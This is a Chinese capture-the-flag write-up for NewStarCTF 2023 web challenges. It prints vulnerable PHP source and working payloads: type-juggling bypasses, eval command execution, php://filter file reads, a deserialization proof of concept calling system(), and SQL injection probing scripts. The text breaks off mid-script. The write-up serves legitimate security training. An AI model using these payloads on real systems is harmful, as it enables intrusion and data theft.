        <content type="html"><![CDATA[<h3 id="NewStarCTF-2023-公开赛道-WEEK1"><a href="#NewStarCTF-2023-公开赛道-WEEK1" class="headerlink" title="NewStarCTF 2023 公开赛道 WEEK1"></a>NewStarCTF 2023 公开赛道 WEEK1</h3><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="WEEK1-WEB-泄漏的秘密"><a href="#WEEK1-WEB-泄漏的秘密" class="headerlink" title="WEEK1|WEB 泄漏的秘密"></a>WEEK1|WEB 泄漏的秘密</h5><p><a href="http://cd98ca4d-7c72-4499-9cb1-010764aa19de.node4.buuoj.cn:81/robots.txt">http://cd98ca4d-7c72-4499-9cb1-010764aa19de.node4.buuoj.cn:81/robots.txt</a></p><p><a href="http://cd98ca4d-7c72-4499-9cb1-010764aa19de.node4.buuoj.cn:81/www.zip">http://cd98ca4d-7c72-4499-9cb1-010764aa19de.node4.buuoj.cn:81/www.zip</a><br>PART ONE: flag{r0bots_1s_s0_us3ful<br>$PART_TWO = “_4nd_<a href="http://www.zip_1s_s0_d4ng3rous}&quot;/">www.zip_1s_s0_d4ng3rous}&quot;</a>;</p><h5 id="WEEK1-WEB-Begin-of-Upload"><a href="#WEEK1-WEB-Begin-of-Upload" class="headerlink" title="WEEK1|WEB Begin of Upload"></a>WEEK1|WEB Begin of Upload</h5><p>前端拦截<br><img src="/images/xinshengsai/20231011112418.png" alt="image-20220126203415648"></p><h5 id="WEEK1-WEB-Begin-of-HTTP"><a href="#WEEK1-WEB-Begin-of-HTTP" class="headerlink" title="WEEK1|WEB Begin of HTTP"></a>WEEK1|WEB Begin of HTTP</h5><p><a href="http://node4.buuoj.cn:29356/?ctf=1">http://node4.buuoj.cn:29356/?ctf=1</a><br>base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk<br>改一下cookie</p><p><img src="/images/xinshengsai/20231011113506.png" alt="image-20220126203415648"></p><h5 id="WEEK1-WEB-ErrorFlask"><a href="#WEEK1-WEB-ErrorFlask" class="headerlink" title="WEEK1|WEB ErrorFlask"></a>WEEK1|WEB ErrorFlask</h5><p><a href="http://e8e7a85b-f054-4efa-8acd-d609723abc02.node4.buuoj.cn:81/?number1=">http://e8e7a85b-f054-4efa-8acd-d609723abc02.node4.buuoj.cn:81/?number1=</a>49&amp;number2=2<br>随便传个参数，源码泄露<br><img src="/images/xinshengsai/20231011113732.png" alt="image-20220126203415648"></p><h5 id="WEEK1-WEB-Begin-of-PHP"><a href="#WEEK1-WEB-Begin-of-PHP" class="headerlink" title="WEEK1|WEB Begin of PHP"></a>WEEK1|WEB Begin of PHP</h5><p>代码很长，都是基础的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 1=&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>] &amp;&amp; md5(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) == md5(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;        <span class="variable">$flag1 </span>= <span class="literal">True</span>;  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 1&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 2=&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;  </span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]) === sha1(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;            <span class="variable">$flag2 </span>= <span class="literal">True</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 2&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 3=&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;  </span><br><span class="line">        <span class="keyword">if</span>(strcmp(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],file_get_contents(<span class="string">&quot;/flag&quot;</span>)) == <span class="number">0</span>)&#123;  <span class="comment">//用[]绕过strcmp</span></span><br><span class="line">                  <span class="variable">$flag3 </span>= <span class="literal">True</span>;  </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 3&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag3</span>)&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 4=&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]))&#123;  </span><br><span class="line">        <span class="keyword">if</span>(!is_numeric(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span>)&#123;            <span class="variable">$flag4 </span>= <span class="literal">True</span>;  </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 4&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 5=&lt;br&gt;&quot;</span>;    extract(<span class="variable">$_POST</span>);  </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST as</span> <span class="variable">$var</span>)&#123;  </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;  </span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">http:<span class="comment">//e9f2544c-4f0e-400c-b5d2-0aa335160abb.node4.buuoj.cn:81/?key1=QNKCDZO&amp;key2=240610708&amp;key4[]=1&amp;key5=2222c</span></span><br><span class="line">post:key3[]=<span class="number">1</span>&amp;flag5=%CE</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="WEEK1-WEB-R-C-E"><a href="#WEEK1-WEB-R-C-E" class="headerlink" title="WEEK1|WEB R!C!E!"></a>WEEK1|WEB R!C!E!</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>]))&#123;    <span class="variable">$password</span>=md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>];  </span><br><span class="line">    <span class="keyword">if</span>(substr(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>)&#123;  </span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;  </span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$code</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有个小密码，用python爆破一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mohu_md5</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1300000</span>):</span><br><span class="line">        t1 =  <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="comment">#t1 =  &#x27;XIPU&#x27;  str(i)+</span></span><br><span class="line">        md5_result = hashlib.md5(t1.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">        <span class="comment">#print(md5_result)</span></span><br><span class="line">        <span class="keyword">if</span> md5_result[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&#x27;c4d038&#x27;</span>:</span><br><span class="line">            <span class="comment"># j = md5_result[10:24]</span></span><br><span class="line">            <span class="comment">#isdigit()判断是否为纯数字，是则为true 反之false</span></span><br><span class="line">            <span class="comment"># if j.isdigit():</span></span><br><span class="line">                <span class="built_in">print</span>(t1 + <span class="string">&quot;-----&gt;&quot;</span>+md5_result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">mohu_md5()</span><br><span class="line"></span><br><span class="line"><span class="comment">#114514-----&gt;c4d038b4bed09fdb1471ef51ec3a32cd</span></span><br></pre></td></tr></table></figure><p>$_POST[‘e_v.a.l’]))这个eval传参的时候，要把<code>_</code>换成<code>[</code>,<br>post:<br><code>password=114514&amp;e[v.a.l=eval($_POST[&#39;a&#39;]);&amp;a=system(&#39;cat /flag&#39;);</code></p><h5 id="WEEK1-WEB-EasyLogin"><a href="#WEEK1-WEB-EasyLogin" class="headerlink" title="WEEK1|WEB EasyLogin"></a>WEEK1|WEB EasyLogin</h5><p>admin爆破即可，加一下md5<br><img src="/images/xinshengsai/20231011160139.png" alt="image-20220126203415648"></p><h5 id="WEEK2-WEB-听说你是游戏高手？"><a href="#WEEK2-WEB-听说你是游戏高手？" class="headerlink" title="WEEK2|WEB 听说你是游戏高手？"></a>WEEK2|WEB 听说你是游戏高手？</h5><p>看一下源码，大于100000000即可，json传参</p><p><img src="/images/xinshengsai/20231009210734.png" alt="image-20220126203415648"><img src="/images/xinshengsai/20231009210939.png" alt="image-20220126203415648"></p><h5 id="WEEK2-WEB-include-0。0"><a href="#WEEK2-WEB-include-0。0" class="headerlink" title="WEEK2|WEB include 0。0"></a>WEEK2|WEB include 0。0</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   highlight_file(<span class="keyword">__FILE__</span>);   <span class="comment">// FLAG in the flag.php   </span></span><br><span class="line"><span class="variable">$file </span>= <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !preg_match(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;       @<span class="keyword">include</span>(<span class="variable">$file</span>);   &#125;<span class="keyword">else</span>&#123;       <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);   &#125;   <span class="meta">?&gt;</span></span><br><span class="line">nope</span><br></pre></td></tr></table></figure><p>任意文件读取，过滤了base  rot，可以用其他协议<br><a href="http://a9e88e4f-6a32-485c-a733-fd09df8be832.node4.buuoj.cn:81/?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php">http://a9e88e4f-6a32-485c-a733-fd09df8be832.node4.buuoj.cn:81/?file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</a><br>得到的东西再转回去即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&lt;hp p//lfga4&#123;2eb4dc-ece724-61-56a454-2c408bdd68&#125;a&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> iconv(<span class="string">&#x27;UCS-2BE&#x27;</span>, <span class="string">&#x27;UCS-2LE&#x27;</span>, <span class="variable">$str</span>);</span><br></pre></td></tr></table></figure><h5 id="WEEK2-WEB-Unserialize？"><a href="#WEEK2-WEB-Unserialize？" class="headerlink" title="WEEK2|WEB Unserialize？"></a>WEEK2|WEB Unserialize？</h5><p>反序列化，private变量被序列化时会产生\x00，要注意url编码<br>过滤了常用查看命令用nl</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?  </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))&#123;  </span><br><span class="line">            @system(<span class="keyword">$this</span>-&gt;cmd);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">@unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&quot;nl /th1s_1s_fffflllll4444aaaggggg&quot;</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))&#123;</span><br><span class="line"></span><br><span class="line">            @system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> evil();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$s</span>));</span><br></pre></td></tr></table></figure><h5 id="WEEK2-WEB-ez-sql"><a href="#WEEK2-WEB-ez-sql" class="headerlink" title="WEEK2|WEB ez_sql"></a>WEEK2|WEB ez_sql</h5><p>sql注入，盲注<br>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">sql_char = [<span class="string">&#x27;select&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;union&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;and&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;or&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;sleep&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;where&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;from&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;limit&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;group&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;by&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;like&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;prepare&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;as&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;if&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;char&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;ascii&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;mid&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;left&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;right&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;substring&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;handler&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;updatexml&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;extractvalue&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;benchmark&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;insert&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;update&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;all&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;@&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;#&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;^&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;&amp;&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;\&#x27;&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;&quot;&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;~&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;`&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;)&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;--&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;=&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27; &#x27;</span>]</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> sql_char:</span><br><span class="line"></span><br><span class="line">    res = requests.get(<span class="string">&quot;http://1f2edf21-fa95-4d74-8410-ad4faffbfb07.node4.buuoj.cn:81/?id=TMP0929&quot;</span>+char)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;no!&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;该字符是非法字符: &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(char))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;通过: &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(char))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入所需模块</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造字母表，根据字母表去爆破每一位的具体值</span></span><br><span class="line"></span><br><span class="line">alphabet = string.ascii_letters + string.digits + <span class="string">&quot;-,&#125;&#123;_=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(alphabet)</span><br><span class="line"></span><br><span class="line">  </span><br><span 